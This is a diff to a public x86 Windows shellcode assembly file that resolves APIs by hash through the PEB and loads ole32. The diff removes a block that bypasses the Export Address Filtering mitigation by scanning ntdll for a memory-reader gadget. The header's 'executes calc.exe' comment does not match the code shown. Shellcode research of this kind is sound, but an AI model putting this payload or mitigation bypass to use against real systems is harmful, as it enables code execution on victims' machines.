@@ -1,10 +1,9 @@
 ; Copyright (c) 2009-2010, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
-; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/
+; Project homepage: https://github.com/SkyLined/w32-speaking-shellcode
 ; All rights reserved. See COPYRIGHT.txt for details.
 BITS 32
 ; Windows x86 null-free shellcode that executes calc.exe.
 ; Works in any application for Windows 5.0-7.0 all service packs.
-; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
 ; This version uses 16-bit hashes.
 
 %include 'w32-speaking-shellcode-hash-list.asm'
@@ -22,23 +21,6 @@ find_hash: ; Find ntdll's InInitOrder list of modules:
     MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
     MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)
 
-%ifdef DEFEAT_EAF
-  ; The first loaded module is ntdll on x86 systems and ntdll32 on x64 systems. Both modules have this code:
-  ; ntdll32!RtlGetCurrentPeb (<no parameter info>)
-  ;     64a118000000    mov     eax,dword ptr fs:[00000018h]
-  ;     8b4030          mov     eax,dword ptr [eax+30h]
-  ;     c3              ret
-      MOV     EDX, [ESI + 0x08]           ; EDX = InInitOrder[X].base_address == module
-      MOVZX   EBP, WORD [EDX + 0x3C]      ; EBX = module->pe_header_offset
-      ADD     EDX, [EDX + EBP + 0x2C]     ; EDX = module + module.pe_header->code_offset == module code
-      MOV     DH, 0xF                     ; The EAF breakpoints are in tables that are at the start of ntdll,
-                                          ; so we can avoid them easily...
-  scan_for_memory_reader:
-      INC     EDX
-      CMP     DWORD [EDX], 0xC330408B     ; EDX => MOV EAX, [EAX+30], RET ?
-      JNE     scan_for_memory_reader
-      PUSH    EDX                         ; Stack = &(defeat eaf)
-%endif
     PUSH    ESI                         ; Stack = InInitOrder[0], [&(defeat eaf)]
     MOV     SI, hash_kernel32_LoadLibraryA
 
@@ -71,12 +53,7 @@ hash_loop: ; Hash the function name and compare with requested hash
     MOV     ESI, [EBX + 0x24]           ; ESI = offset ordinals table
     ADD     ESI, EBP                    ; ESI = &oridinals table
     MOVZX   ESI, WORD [ESI + 2 * ECX]   ; ESI = ordinal number of function
-%ifdef DEFEAT_EAF
-    LEA     EAX, [EBX + 0x1C - 0x30]    ; EAX = &offset address table - MEMORY_READER_OFFSET
-    CALL    [ESP + 4]                   ; call defeat eaf: EAX = [EAX + 0x30] == [&offset address table] == offset address table
-%else
     MOV     EAX, [EBX + 0x1C]           ; EDI = offset address table
-%endif
     ADD     EAX, EBP                    ; EAX = &address table
     MOV     EDI, [EAX + 4 * ESI]        ; EDI = offset function
     ADD     EDI, EBP                    ; EDI = &(function)
@@ -91,10 +68,6 @@ kernel32_LoadLibrary:
     PUSH    ESP                         ; Stack = &("ole32"), "ole32\0\0\0", InInitOrder[X] [, &(defeat eaf)]
     CALL    EDI                         ; LoadLibraryA(&("ole32")) | Stack = "ole32\0\0\0", InInitOrder[X] [, &(defeat eaf)]
     XCHG    EAX, EBP                    ; EBP = &(ole32.dll)
-%ifdef DEFEAT_EAF
-    POP     EAX                         ; Stack = "2\0\0\0", InInitOrder[X], &(defeat eaf)]
-    POP     EAX                         ; Stack = InInitOrder[X], &(defeat eaf)
-%endif
     MOV     SI, hash_ole32_CoInitialize ;
     JMP     get_proc_address_loop
 
